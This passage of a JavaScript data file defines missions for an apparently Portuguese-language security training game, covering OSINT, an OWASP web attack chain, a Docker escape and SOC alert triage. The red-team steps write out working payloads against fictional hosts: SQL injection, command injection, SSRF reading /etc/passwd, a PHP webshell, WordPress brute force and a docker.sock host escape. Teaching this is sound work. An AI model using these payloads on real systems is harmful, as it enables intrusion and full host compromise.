         body:`Tipos comuns: A (IP), TXT (texto), MX (mail). Subdomínios com <code>_</code> (como <code>_dmarc</code>, <code>_secret</code>) guardam metadados — e às vezes pistas.`},
        {term:"Consultar TXT com <span class='cmd'>dig</span>",status:"comando",gate:true,
         body:`<code>dig _secret.marcoribeiro.pt TXT +short</code> devolve o conteúdo do registo TXT — aqui, uma mensagem cifrada.`,
         load:"dig _secret.marcoribeiro.pt TXT +short"}
      ],
      hint:"dig _secret.marcoribeiro.pt TXT +short",
      test:c=>/dig|nslookup|host/.test(c)&&/_secret|TXT|marcoribeiro/.test(c),
      output:()=>[
        {t:"sys",x:"; <<>> DiG 9.18 <<>> _secret.marcoribeiro.pt TXT"},
        {t:"good",x:'"SYNT{0F1AG_z4ep0_e1o31e0_cja3q}"'},
        {t:"warnline",x:"Parece cifrado — letras trocadas. Cifra de César / ROT13?"}
      ],
      reveal:"O TXT esconde a flag, mas está cifrada com uma substituição. Hora de decifrar."
    },
    {
      type:"command", n:"caesar", short:"César",
      eyebrow:"Fase 05 · Criptografia clássica",
      title:"Decifrar a flag final (ROT13)",
      dossier:`<p class="lead">A <b>cifra de César</b> desloca cada letra um número fixo de posições. O caso especial <b>ROT13</b> desloca 13 — e é a sua própria inversa.</p>
        <p>O <code>tr</code> faz a substituição de caracteres num só passo, revelando a mensagem original.</p>`,
      concepts:[
        {term:"Cifra de César & ROT13",status:"conceito",
         body:`Substituição monoalfabética: A→N, B→O… Como o alfabeto tem 26 letras, aplicar ROT13 duas vezes devolve o original. Trivial de quebrar, mas comum em CTFs.`},
        {term:"Decifrar com <span class='cmd'>tr</span>",status:"comando",gate:true,
         body:`<code>echo "TEXTO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> mapeia cada letra 13 posições à frente. Aplica ao conteúdo do TXT.`,
         load:`echo "SYNT{0F1AG_z4ep0_e1o31e0_cja3q}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`}
      ],
      hint:`echo "SYNT{...}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`,
      test:c=>/tr\s+['"]?A-Za-z/.test(c)&&/N-ZA-Mn-za-m/.test(c),
      output:()=>[
        {t:"good",x:"FLAG{0S1NT_m4rc0_r1b31r0_pwn3d}"}
      ],
      ctx:null,
      flag:"FLAG{0S1NT_m4rc0_r1b31r0_pwn3d}",
      reveal:"Decifrado! As pegadas de Marco Ribeiro levaram-te à flag final.",
      summary:{tecnica:"Cadeia OSINT completa",vetor:"Esteganografia + geolocalização + história Git + DNS + cifra clássica",ferramentas:"exiftool, steghide, git, dig, tr",licao:"Metadados, commits apagados e DNS expõem mais do que parece. Higiene digital é defesa."}
    }
  ]
},
/* ===================== MISSÃO 4 — WEB APP (red) ===================== */
{
  id:"NOA-WEB-04", code:"OWASP", title:"Aplicação Sob Cerco", track:"red", domain:"D2",
  blurb:"O portal de alunos do IPB acumula falhas clássicas da OWASP. Encadeia SQLi, IDOR, command injection, abuso de JWT e SSRF até comprometeres a aplicação.",
  tags:["SQL Injection","IDOR","Command Injection","JWT","SSRF"],
  intro:[
    {t:"sys",x:"[ DOSSIÊ ] Alvo: portal.ipb.local — aplicação web de gestão de alunos, em produção sem revisão de segurança."},
    {t:"sys",x:"[ DOSSIÊ ] Âmbito autorizado: testar as falhas do OWASP Top 10 e documentar o impacto."},
    {t:"sys",x:"[ OBJETIVO ] Bypass de login → acesso a dados alheios → execução de comandos → forjar token → leitura de ficheiros internos."}
  ],
  steps:[
    {
      type:"command", n:"sqli", short:"SQLi",
      eyebrow:"Fase 01 · Injeção de SQL",
      title:"Contornar o login com SQL Injection",
      dossier:`<p class="lead">Quando o input do utilizador entra numa query SQL sem validação, podemos reescrever a lógica da consulta.</p>
        <p>Injetando uma condição sempre verdadeira (<code>' OR '1'='1</code>) a verificação de password colapsa e o login passa.</p>`,
      concepts:[
        {term:"SQL Injection & autenticação",status:"conceito",
         body:`A query <code>SELECT * FROM users WHERE user='X' AND pass='Y'</code> torna-se manipulável se Y for <code>' OR '1'='1</code>: a condição é sempre verdadeira e o servidor autentica sem password válida.`},
        {term:"Payload de bypass com <span class='cmd'>curl</span>",status:"comando",gate:true,
         body:`Envia o payload no campo da password. O comentário <code>--</code> ignora o resto da query.`,
         load:`curl -d "user=admin&pass=' OR '1'='1' -- " http://portal.ipb.local/login`}
      ],
      hint:`curl -d "user=admin&pass=' OR '1'='1' -- " http://portal.ipb.local/login`,
      test:c=>/curl|wget/.test(c)&&/(or\s+'?1'?\s*=\s*'?1|or\s+1\s*=\s*1)/i.test(c),
      output:()=>[
        {t:"sys",x:"POST /login HTTP/1.1"},
        {t:"good",x:"HTTP/1.1 302 Found  ->  /dashboard"},
        {t:"good",x:"[+] Autenticado como 'admin' sem password válida."},
        {t:"warnline",x:"Cookie: session=eyJ... (JWT) — guardar para depois"}
      ],
      reveal:"Login contornado. O dashboard expõe perfis acedidos por um parâmetro 'id'."
    },
    {
      type:"command", n:"idor", short:"IDOR",
      eyebrow:"Fase 02 · Controlo de acesso quebrado",
      title:"Aceder a dados de outros utilizadores (IDOR)",
      dossier:`<p class="lead">A app mostra <code>/perfil?id=1</code> para o teu utilizador. Se o servidor não verificar a quem pertence o id, basta mudá-lo.</p>
        <p>É um <b>IDOR</b> — referência direta a objeto insegura — uma das falhas de controlo de acesso mais comuns.</p>`,
      concepts:[
        {term:"IDOR (referência insegura)",status:"conceito",
         body:`O identificador é previsível e o servidor não valida a autorização. Trocar <code>id=1</code> por <code>id=1337</code> devolve dados que não deviam ser teus.`},
        {term:"Explorar o parâmetro",status:"comando",gate:true,
         body:`Pede o perfil de outro id diretamente: <code>curl http://portal.ipb.local/perfil?id=1337</code>.`,
         load:`curl http://portal.ipb.local/perfil?id=1337`}
      ],
      hint:`curl http://portal.ipb.local/perfil?id=1337`,
      test:c=>/curl|wget/.test(c)&&/id=\d+/.test(c)&&/portal|perfil/.test(c),
      output:()=>[
        {t:"good",x:'{ "id":1337, "nome":"Marco Ribeiro", "role":"staff", "nota_interna":"acesso a /admin/diagnostico" }'},
        {t:"warnline",x:"Existe uma ferramenta interna /admin/diagnostico com um parâmetro 'host' para ping."}
      ],
      reveal:"Encontraste dados de staff e uma ferramenta de diagnóstico que faz ping a um host fornecido."
    },
    {
      type:"command", n:"cmdi", short:"Cmd Inj",
      eyebrow:"Fase 03 · Command Injection",
      title:"Executar comandos pela ferramenta de ping",
      dossier:`<p class="lead">Se a app passar o teu input diretamente para a shell (ex.: <code>ping &lt;host&gt;</code>), um separador como <code>;</code> deixa-te anexar os teus próprios comandos.</p>
        <p>É <b>command injection</b>: o servidor executa o que injetares com os privilégios do processo web.</p>`,
      concepts:[
        {term:"Command Injection",status:"conceito",
         body:`Metacaracteres da shell (<code>;</code> <code>|</code> <code>&amp;&amp;</code>) encadeiam comandos. <code>host=127.0.0.1;id</code> executa o ping e, a seguir, <code>id</code>.`},
        {term:"Injetar <span class='cmd'>;id</span>",status:"comando",gate:true,
         body:`Acrescenta um comando ao parâmetro: <code>?host=127.0.0.1;id</code>.`,
         load:`curl "http://portal.ipb.local/admin/diagnostico?host=127.0.0.1;id"`}
      ],
      hint:`curl "http://portal.ipb.local/admin/diagnostico?host=127.0.0.1;id"`,
      test:c=>/curl|wget/.test(c)&&/host=/.test(c)&&/(;|\||%3b|&&)\s*(id|whoami|cat|ls|uname)/i.test(c),
      output:()=>[
        {t:"sys",x:"PING 127.0.0.1: 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64"},
        {t:"good",x:"uid=33(www-data) gid=33(www-data) groups=33(www-data)"},
        {t:"warnline",x:"Execução confirmada como www-data. A app valida sessões via JWT."}
      ],
      reveal:"Tens execução de comandos como www-data. Agora vamos abusar do token JWT da sessão."
    },
    {
      type:"choice", n:"jwt", short:"JWT",
      eyebrow:"Fase 04 · Abuso de JWT",
      title:"Forjar um token de administrador",
      dossier:`<p class="lead">Um <b>JWT</b> tem 3 partes: cabeçalho, dados e assinatura. O cabeçalho diz o algoritmo de assinatura.</p>
        <p>Se o servidor aceitar <code>alg:none</code>, a assinatura deixa de ser verificada — e podemos editar os dados à vontade.</p>`,
      concepts:[
        {term:"Estrutura e a falha <span class='cmd'>alg:none</span>",status:"conceito",
         body:`Em <code>header.payload.signature</code>, definir <code>"alg":"none"</code> e enviar o token <b>sem</b> assinatura faz servidores mal configurados confiarem em dados não verificados.`},
        {term:"Privilege escalation por token",status:"conceito",
         body:`Alterando o campo <code>role</code> de <code>user</code> para <code>admin</code> no payload, ganhamos privilégios — desde que a assinatura não seja validada.`}
      ],
      question:"O servidor aceita o cabeçalho alg:none. Qual a manipulação que forja um administrador?",
      options:[
        {label:"Definir alg:none, remover a assinatura e mudar role para admin no payload",correct:true,
         explain:"Sem verificação de assinatura, o servidor confia no payload alterado — role:admin é aceite."},
        {label:"Aumentar o campo exp para o token durar mais tempo",
         explain:"Prolongar a validade não dá privilégios extra nem contorna a verificação."},
        {label:"Voltar a codificar o token original em Base64 sem alterações",
         explain:"Recodificar não muda nada; o token continua a ser de utilizador comum."}
      ],
      reveal:"Token forjado com role:admin aceite. Painel de administração desbloqueado — falta uma última falha.",
      flag:null
    },
    {
      type:"command", n:"ssrf", short:"SSRF",
      eyebrow:"Fase 05 · Server-Side Request Forgery",
      title:"Ler ficheiros internos via SSRF",
      dossier:`<p class="lead">O painel admin tem um recurso que "busca" URLs no servidor. Se não restringir o esquema, podemos pedir <code>file://</code> e ler o disco.</p>
        <p>É <b>SSRF</b>: o servidor faz o pedido por nós, alcançando recursos internos inacessíveis de fora.</p>`,
      concepts:[
        {term:"SSRF & o esquema <span class='cmd'>file://</span>",status:"conceito",
         body:`Numa SSRF o servidor é o cliente. Trocando <code>http://</code> por <code>file:///etc/passwd</code> lemos ficheiros locais; apontando a IPs internos alcançamos serviços da rede privada.`},
        {term:"Disparar a leitura",status:"comando",gate:true,
         body:`<code>curl "http://portal.ipb.local/admin/fetch?url=file:///etc/passwd"</code>.`,
         load:`curl "http://portal.ipb.local/admin/fetch?url=file:///etc/passwd"`}
      ],
      hint:`curl "http://portal.ipb.local/admin/fetch?url=file:///etc/passwd"`,
      test:c=>/curl|wget/.test(c)&&/file:\/\//.test(c)&&/etc\/passwd|fetch/.test(c),
      output:()=>[
        {t:"sys",x:"GET /admin/fetch?url=file:///etc/passwd"},
        {t:"good",x:"root:x:0:0:root:/root:/bin/bash"},
        {t:"good",x:"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"},
        {t:"sys",x:"# leitura arbitrária de ficheiros confirmada"}
      ],
      ctx:null,
      flag:"FLAG{0WASP_w3b_4n4ly5t_pt}",
      reveal:"Cadeia OWASP completa: da injeção à leitura de ficheiros internos.",
      summary:{tecnica:"Cadeia de falhas web OWASP",vetor:"SQLi + IDOR + Command Injection + JWT none + SSRF",ferramentas:"curl",licao:"Validar e parametrizar todo o input, autorizar cada acesso por recurso, verificar assinaturas JWT e restringir esquemas/URLs em fetchers."}
    }
  ]
},
/* ===================== MISSÃO 5 — DOCKER (red) ===================== */
{
  id:"NOA-CTF-05", code:"DOCKER", title:"Fuga do Contentor", track:"red", domain:"D2",
  blurb:"Um blog WordPress vulnerável dá-te uma shell dentro de um contentor Docker mal isolado. Deteta o isolamento, abusa do Docker socket e escapa para o host.",
  tags:["WordPress","WebShell","Docker","Container Escape"],
  intro:[
    {t:"sys",x:"[ DOSSIÊ ] Alvo: blog.ipb.local — WordPress desatualizado a correr dentro de um contentor."},
    {t:"sys",x:"[ DOSSIÊ ] Suspeita: o socket do Docker está montado dentro do contentor (má prática frequente)."},
    {t:"sys",x:"[ OBJETIVO ] Acesso ao WP → webshell → confirmar contentor → abusar do Docker socket → root no host."}
  ],
  steps:[
    {
      type:"command", n:"wpscan", short:"WPScan",
      eyebrow:"Fase 01 · Acesso ao WordPress",
      title:"Quebrar o login do WordPress",
      dossier:`<p class="lead">O WordPress expõe utilizadores e, via XML-RPC, permite muitas tentativas de login num só pedido — amplificando a força bruta.</p>
        <p>O <b>wpscan</b> enumera utilizadores e plugins e automatiza o ataque de dicionário.</p>`,
      concepts:[
        {term:"XML-RPC & força bruta amplificada",status:"conceito",
         body:`O método <code>system.multicall</code> do XML-RPC testa dezenas de passwords num único pedido HTTP, tornando o brute force muito mais rápido e silencioso.`},
        {term:"<span class='cmd'>wpscan</span> com wordlist",status:"comando",gate:true,
         body:`<code>wpscan --url ALVO --usernames admin --passwords rockyou.txt</code> enumera e ataca.`,
         load:`wpscan --url http://blog.ipb.local --usernames admin --passwords /usr/share/wordlists/rockyou.txt`}
      ],
      hint:`wpscan --url http://blog.ipb.local --usernames admin --passwords /usr/share/wordlists/rockyou.txt`,
      test:c=>/wpscan|hydra|curl/.test(c)&&/url|xmlrpc|blog/.test(c)&&/password|rockyou|admin/.test(c),
      output:()=>[
        {t:"sys",x:"[+] WordPress 5.7.1 identificado (vulnerável)"},
        {t:"sys",x:"[+] XML-RPC ativo em /xmlrpc.php"},
        {t:"good",x:"[SUCCESS] User: admin  Password: sunshine"},
        {t:"sys",x:"Acesso ao painel /wp-admin obtido."}
      ],
      reveal:"Entraste no wp-admin. O editor de temas permite escrever PHP — uma webshell."
    },
    {
      type:"command", n:"webshell", short:"WebShell",
      eyebrow:"Fase 02 · Execução via WebShell",
      title:"Plantar e usar uma webshell",
      dossier:`<p class="lead">Com acesso ao editor de temas, injetamos PHP num ficheiro do tema (ex.: <code>404.php</code>) que executa comandos a partir de um parâmetro.</p>
        <p>A partir daí, qualquer pedido HTTP a esse ficheiro corre comandos no servidor.</p>`,
      concepts:[
        {term:"WebShell no tema",status:"conceito",
         body:`Inserindo <code>&lt;?php system($_GET['cmd']); ?&gt;</code> num ficheiro do tema, o pedido <code>404.php?cmd=id</code> executa <code>id</code> no servidor.`},
        {term:"Invocar a webshell",status:"comando",gate:true,
         body:`<code>curl "http://blog.ipb.local/wp-content/themes/twentyx/404.php?cmd=id"</code>.`,
         load:`curl "http://blog.ipb.local/wp-content/themes/twentyx/404.php?cmd=id"`}
      ],
      hint:`curl "http://blog.ipb.local/wp-content/themes/twentyx/404.php?cmd=id"`,
      test:c=>/curl|wget/.test(c)&&/\.php/.test(c)&&/cmd=|c=/.test(c),
      output:()=>[
        {t:"good",x:"uid=33(www-data) gid=33(www-data)"},
        {t:"warnline",x:"hostname: 7f3a9c2b1e04   (parece um ID de contentor)"}
      ],
      ctx:"www-data@7f3a9c2b1e04",
      reveal:"Tens execução como www-data, mas o hostname sugere que estás dentro de um contentor."
    },
    {
      type:"command", n:"enumdock", short:"Enum",
      eyebrow:"Fase 03 · Deteção de contentor",
      title:"Confirmar o ambiente e achar o socket",
      dossier:`<p class="lead">Antes de escapar, confirmamos que estamos num contentor e procuramos o que o liga ao host: o <b>Docker socket</b>.</p>
        <p>Indícios típicos: <code>/.dockerenv</code> e a presença de <code>docker</code> em <code>/proc/1/cgroup</code>.</p>`,
      concepts:[
        {term:"Indicadores de contentor",status:"conceito",
         body:`<code>/.dockerenv</code> existe em contentores Docker; <code>cat /proc/1/cgroup</code> mostra caminhos com <code>docker</code>. São sinais de que não estás no host.`},
        {term:"O <span class='cmd'>docker.sock</span> montado",status:"comando",gate:true,
         body:`Se <code>/var/run/docker.sock</code> estiver acessível dentro do contentor, podes comandar o Docker do host. Verifica com <code>ls -la /var/run/docker.sock</code>.`,
         load:`cat /proc/1/cgroup; ls -la /var/run/docker.sock`}
      ],
      hint:`cat /proc/1/cgroup; ls -la /var/run/docker.sock`,
      test:c=>/cgroup|docker\.sock|dockerenv|\/proc\/1/.test(c),
      output:()=>[
        {t:"line",x:"12:devices:/docker/7f3a9c2b1e04..."},
        {t:"good",x:"srw-rw---- 1 root www-data /var/run/docker.sock"},
        {t:"warnline",x:"O socket do Docker está montado e legível pelo grupo www-data — falha crítica de isolamento."}
      ],
      reveal:"Confirmado: socket Docker exposto dentro do contentor. Quem fala com o socket controla o host."
    },
    {
      type:"command", n:"escape", short:"Escape",
      eyebrow:"Fase 04 · Container Escape",
      title:"Montar o host e fugir do contentor",
      dossier:`<p class="lead">O Docker daemon corre como root no host. Com acesso ao socket, lançamos um contentor que monta a raiz do host (<code>/</code>) e fazemos <code>chroot</code> para lá.</p>
        <p>Resultado: uma shell root no sistema anfitrião, fora do contentor.</p>`,
      concepts:[
        {term:"Docker socket = root no host",status:"conceito",
         body:`Pedir ao daemon para correr <code>-v /:/host</code> monta todo o disco do host dentro de um novo contentor; <code>chroot /host</code> dá-te o sistema de ficheiros real como root.`},
        {term:"Lançar o escape",status:"comando",gate:true,
         body:`<code>docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh</code>.`,
         load:`docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh`}
      ],
      hint:`docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh`,
      test:c=>/docker/.test(c)&&/docker\.sock|-H/.test(c)&&/\/:\/host|\/host/.test(c),
      output:()=>[
        {t:"sys",x:"Unable to find image 'alpine:latest' locally — pulling..."},
        {t:"good",x:"/ # id"},
        {t:"good",x:"uid=0(root) gid=0(root)  -- agora no HOST"}
      ],
      ctx:"root@host",
      reveal:"Escapaste para o host como root. Só falta capturar a flag."
    },
    {
      type:"command", n:"roothost", short:"Root",
      eyebrow:"Fase 05 · Comprometimento do host",
      title:"Capturar a flag no host",
      dossier:`<p class="lead">Já com o sistema de ficheiros do host montado em <code>/host</code> e shell root, lemos a flag do anfitrião.</p>`,
      concepts:[
        {term:"Ler a flag do host",status:"comando",gate:true,
         body:`A raiz do host está em <code>/host</code>. Lê <code>cat /host/root/root.txt</code>.`,
         load:`cat /host/root/root.txt`}
      ],
      hint:`cat /host/root/root.txt`,
      test:c=>/cat|less|head/.test(c)&&/root\.txt/.test(c),
      output:()=>[
        {t:"good",x:"# cat /host/root/root.txt"}
      ],
      ctx:"root@host",
      flag:"FLAG{D0ck3r_s0ck3t_3sc4p3}",
      reveal:"Host totalmente comprometido a partir de um contentor mal isolado.",
      summary:{tecnica:"Container escape via Docker socket",vetor:"WordPress→webshell→socket Docker montado→chroot no host",ferramentas:"wpscan, curl, docker",licao:"Nunca montar /var/run/docker.sock dentro de contentores. Manter o WordPress atualizado e desativar XML-RPC se não for necessário."}
    }
  ]
},
/* ===================== SOC-01 — TRIAGEM (blue) ===================== */
{
  id:"SOC-01", code:"SOC", title:"Primeiro Turno", track:"blue", domain:"D4",
  blurb:"O teu primeiro turno como analista SOC de nível 1. Faz a triagem da fila de alertas do SIEM: separa o ruído das ameaças reais e decide o que escalar.",
  tags:["SIEM","Triagem","Severidade","Falso Positivo","Escalonamento"],
  intro:[
    {t:"sys",x:"[ SOC ] Bem-vindo à consola do Security Operations Center do IPB. Turno: noturno."},
    {t:"sys",x:"[ SOC ] A tua função (Tier 1): triar alertas, descartar falsos positivos e escalar incidentes reais para o Tier 2."},
    {t:"warnline",x:"[ SOC ] Cuidado com a fadiga de alertas: classificar mal gera ruído ou deixa passar ataques."}
  ],
  steps:[
    {
      type:"triage", n:"queue1", short:"Fila 1",
      eyebrow:"Fase 01 · Triagem inicial",
      title:"Classificar a fila de alertas",
      dossier:`<p class="lead">Cada alerta do SIEM tem de receber uma <b>severidade</b>. A severidade orienta a prioridade e a resposta — não é o tipo de evento, é o risco que representa.</p>
        <p>Lê a fonte, a assinatura e o registo em bruto, e escolhe a severidade correta para cada um.</p>`,
      concepts:[
        {term:"O que é um SIEM",
         body:`Um <b>SIEM</b> agrega logs de toda a infraestrutura (firewall, servidores, AV, proxy) e gera alertas por correlação. É a janela do analista para a rede.`},
        {term:"Escala de severidade",
         body:`<b>Crítico</b>: ataque ativo/comprometimento. <b>Alto</b>: forte indício de ameaça. <b>Médio</b>: suspeito, investigar. <b>Baixo</b>: violação menor de política. <b>Falso positivo</b>: benigno/esperado.`},
        {term:"Falsos positivos",
         body:`Nem todo o alerta é ameaça. Ficheiros de teste (EICAR), manutenção planeada ou tráfego legítimo geram ruído. Descartá-los corretamente reduz a fadiga de alertas.`}
      ],
      alerts:[
        {src:"Auth",sig:"218 falhas de login SSH para 'gandalf' em 30s, todas de 203.0.113.66",raw:"sshd: Failed password for gandalf from 203.0.113.66 (x218)",sev:"crit",
         why:"Força bruta ativa contra uma conta real, de um único IP externo. Ataque em curso — crítico."},
        {src:"IDS",sig:"Varredura SYN de 10.1.2.40 contra toda a sub-rede 10.1.2.0/24",raw:"Snort: (portscan) TCP SYN sweep",sev:"high",
         why:"Reconhecimento ativo de rede; precursor típico de ataque. Investigar e correlacionar."},
        {src:"Antivírus",sig:"Ficheiro EICAR detetado na sandbox de testes de QA",raw:"AV: EICAR-Test-File in /qa/sandbox/",sev:"fp",
         why:"O EICAR é um ficheiro inofensivo usado para testar antivírus, e está num ambiente de QA. Falso positivo."},
        {src:"Proxy",sig:"Utilizador acedeu a uma rede social no horário de trabalho",raw:"proxy: ALLOW facebook.com user=ana.silva",sev:"low",
         why:"Quando muito, é violação de política de uso aceitável — não é um incidente de segurança. Severidade baixa."}
      ],
      reveal:"Boa triagem. O brute force crítico precisa de uma decisão de resposta imediata."
    },
    {
      type:"choice", n:"escalate", short:"Resposta",
      eyebrow:"Fase 02 · Decisão de resposta",
      title:"Responder ao brute force crítico",
      dossier:`<p class="lead">Identificaste um ataque de força bruta em curso. A primeira resposta tem de conter o risco e preservar evidências, seguindo o procedimento.</p>`,
      concepts:[
        {term:"Contenção & escalonamento",
         body:`O Tier 1 contém e escala. Para um brute force ativo: bloquear/limitar o IP de origem, sinalizar a conta visada e escalar para o Tier 2 com o contexto. Nunca interagir com o atacante.`}
      ],
      question:"Confirmaste um ataque de força bruta ativo ao SSH. Qual é a primeira ação correta?",
      options:[
        {label:"Bloquear o IP de origem, sinalizar a conta 'gandalf' e escalar para o Tier 2 com as evidências",correct:true,
         explain:"Contenção (bloquear o IP) + preservar a conta visada + escalar com contexto é o fluxo correto de IR."},
        {label:"Esperar até ao fim do turno para ver se o ataque para sozinho",
         explain:"Esperar permite que o ataque continue e possa ter sucesso. Inaceitável perante um alerta crítico."},
        {label:"Responder ao IP atacante com uma varredura para identificar o atacante",
         explain:"Contra-atacar é ilegal e fora de âmbito. O analista contém e escala, não retalia."}
      ],
      reveal:"Resposta correta registada. Chega uma segunda vaga de alertas — mais subtil."
    },
    {
      type:"triage", n:"queue2", short:"Fila 2",
      eyebrow:"Fase 03 · Triagem avançada",
      title:"Distinguir sinais fracos de ameaça",
      dossier:`<p class="lead">Nem tudo é óbvio. Beaconing periódico, logins improváveis e exfiltração disfarçam-se de tráfego normal. Olha para o padrão, não só para o evento.</p>`,
      concepts:[
        {term:"Beaconing / C2",
         body:`Malware costuma "ligar a casa" em intervalos regulares (ex.: a cada 60s) para um servidor de comando e controlo. Esse padrão periódico é um forte indício de host comprometido.`},
        {term:"Login improvável & exfiltração",
         body:`Logins de geografias/horários anómalos sugerem conta comprometida; grandes transferências para destinos pessoais sugerem exfiltração de dados.`}
      ],
      alerts:[
        {src:"IDS",sig:"Ligação de saída para 185.22.7.9:4444 a cada 60s, há 2 horas",raw:"netflow: periodic egress 4444/tcp (beacon)",sev:"crit",
         why:"Padrão periódico para uma porta de C2 conhecida (4444). Indício claro de host comprometido com beaconing — crítico."},
        {src:"Auth",sig:"Login bem-sucedido de 'admin' às 03:14 a partir de um país onde a conta nunca operou",raw:"login OK admin from 41.x (geo: novo)",sev:"high",
         why:"Viagem impossível / login improvável. Possível conta comprometida — alto, investigar de imediato."},
        {src:"DLP",sig:"Upload de 4 GB para um serviço de cloud pessoal a partir de um portátil corporativo",raw:"dlp: 4GB -> personal-drive",sev:"high",
         why:"Volume e destino sugerem exfiltração de dados. Severidade alta."},
        {src:"Sistema",sig:"Reinício agendado do servidor de backups na janela de manutenção",raw:"cron: scheduled reboot 04:00",sev:"fp",
         why:"Atividade de manutenção planeada e documentada. Não é incidente — falso positivo."}
      ],
      flag:"FLAG{S0C_t13r1_tr14g3m_ok}",
      reveal:"Turno concluído com triagem sólida: ruído descartado, ameaças reais escaladas.",
      summary:{tecnica:"Triagem de alertas SOC (Tier 1)",vetor:"SIEM · severidade · falso positivo · escalonamento",ferramentas:"Consola SIEM",licao:"Classificar pelo risco, não pelo tipo. Beaconing, logins improváveis e exfiltração são de alta prioridade; EICAR e manutenção são ruído."}
    }
  ]
},
/* ===================== SOC-02 — LOG HUNT (blue) ===================== */
{
  id:"SOC-02", code:"SOC", title:"Seguir o Rasto", track:"blue", domain:"D4",
  blurb:"Um servidor disparou alertas. Mergulha nas logs com a linha de comandos, reconstrói o que o atacante fez e reconhece — pelas pegadas — os ataques das operações ofensivas.",
  tags:["Análise de Logs","grep","IOC","auth.log","MITRE ATT&CK"],
  intro:[
    {t:"sys",x:"[ SOC ] Caso aberto: web01 gerou alertas de autenticação e tráfego anómalo."},
    {t:"sys",x:"[ SOC ] Tens as logs do host. Reconstrói a cadeia de ataque e extrai os indicadores de compromisso (IOC)."},
    {t:"warnline",x:"[ SOC ] Vais reconhecer estas pegadas: são os ataques que aprendeste a executar no Red Team."}
  ],
  steps:[
    {
      type:"command", n:"authlog", short:"auth.log",
      eyebrow:"Fase 01 · Logs de autenticação",
      title:"Detetar a força bruta no auth.log",
      dossier:`<p class="lead">O <code>/var/log/auth.log</code> regista todas as autenticações. Dezenas de <code>Failed password</code> seguidas de um <code>Accepted</code> contam a história de um brute force bem-sucedido.</p>`,
      concepts:[
        {term:"auth.log & padrões de brute force",
         body:`<code>Failed password</code> repetido do mesmo IP indica tentativa de força bruta. Um <code>Accepted password</code> a seguir significa que o ataque teve sucesso.`},
        {term:"Contar com <span class='cmd'>grep</span> + <span class='cmd'>uniq</span>",status:"comando",gate:true,
         body:`<code>grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr</code> agrega tentativas por IP, revelando o atacante.`,
         load:`grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr`}
      ],
      hint:`grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr`,
      test:c=>/grep|awk|zgrep/.test(c)&&/auth\.log|Failed/.test(c),
      output:()=>[
        {t:"line",x:"   4127 203.0.113.66"},
        {t:"line",x:"      3 192.168.1.10"},
        {t:"warnline",x:"-- e logo a seguir no log --"},
        {t:"good",x:"Accepted password for gandalf from 203.0.113.66"},
        {t:"errline",x:"Brute force BEM-SUCEDIDO: 203.0.113.66 comprometeu 'gandalf'."}
      ],
      reveal:"O IP 203.0.113.66 forçou o SSH de 'gandalf'. Vê o que fez depois nos logs do servidor web."
    },
    {
      type:"loghunt", n:"weblog", short:"access.log",
      eyebrow:"Fase 02 · Logs do servidor web",
      title:"Isolar os pedidos maliciosos",
      dossier:`<p class="lead">No <code>access.log</code>, o tráfego legítimo mistura-se com o ataque. Identifica todas as linhas que representam reconhecimento ou exploração — e ignora o ruído normal.</p>`,
      concepts:[
        {term:"Ler um access.log",
         body:`Cada linha tem IP, pedido e código de resposta. Pedidos a páginas de notas internas, payloads codificados ou metacaracteres de shell denunciam o atacante.`}
      ],
      logs:[
        {c:'192.168.1.10 - GET /index.html 200'},
        {c:'192.168.1.10 - GET /css/style.css 200'},
        {c:'203.0.113.66 - GET /dev-notes.html 200', bad:true},
        {c:'203.0.113.66 - GET /?session=Tzo0OiJMb2ci...%2Fetc%2Fpasswd 200', bad:true},
        {c:'192.168.1.22 - GET /favicon.ico 404'},
        {c:'203.0.113.66 - GET /admin/diagnostico?host=127.0.0.1;id 200', bad:true},
        {c:'192.168.1.10 - GET /sobre.html 200'}
      ],
      reveal:"Reconhecimento (dev-notes), LFI (cookie a apontar /etc/passwd) e command injection — todos do mesmo IP. Extrai os IOC.",
      flag:null
    },
    {
      type:"command", n:"ioc", short:"IOC",
      eyebrow:"Fase 03 · Indicadores de Compromisso",
      title:"Extrair os IOC do atacante",
      dossier:`<p class="lead">Um <b>IOC</b> (Indicador de Compromisso) é um artefacto que identifica a atividade maliciosa: um IP, um domínio, um hash, um caminho. Servem para bloquear e para caçar o mesmo atacante noutros sistemas.</p>`,
      concepts:[
        {term:"O que é um IOC",
         body:`IPs de origem, hashes de ficheiros, domínios de C2 e User-Agents incomuns são IOCs. Documentá-los permite bloquear e procurar a ameaça em toda a infraestrutura.`},
        {term:"Caçar o IP em todas as logs",status:"comando",gate:true,
         body:`<code>grep -r "203.0.113.66" /var/log/</code> mostra onde mais o atacante atuou.`,
         load:`grep -r "203.0.113.66" /var/log/`}
      ],
      hint:`grep -r "203.0.113.66" /var/log/`,
      test:c=>/grep|zgrep/.test(c)&&/203\.0\.113\.66/.test(c),
      output:()=>[
        {t:"line",x:"auth.log:  Accepted password for gandalf from 203.0.113.66"},
        {t:"line",x:"access.log: GET /admin/diagnostico?host=127.0.0.1;id"},
        {t:"warnline",x:"syslog: outbound connection 185.22.7.9:4444 (reverse shell)"},
        {t:"good",x:"IOCs: IP atacante 203.0.113.66 · C2 185.22.7.9:4444 · conta afetada gandalf"}
      ],
      reveal:"IOCs reunidos. Falta classificar a fase final da cadeia segundo o MITRE ATT&CK."
    },
    {
      type:"choice", n:"mitre", short:"ATT&CK",
      eyebrow:"Fase 04 · Mapeamento MITRE ATT&CK",
      title:"Classificar a cadeia de ataque",
      dossier:`<p class="lead">O <b>MITRE ATT&CK</b> é um catálogo de táticas e técnicas de adversários. Mapear o que viste a táticas ajuda a comunicar e a defender de forma estruturada.</p>`,
      concepts:[
        {term:"Táticas do MITRE ATT&CK",
         body:`Sequência típica: <b>Reconnaissance</b> → <b>Initial Access</b> → <b>Execution</b> → <b>Command and Control</b> → <b>Exfiltration</b>. Cada ação observada encaixa numa tática.`}
      ],
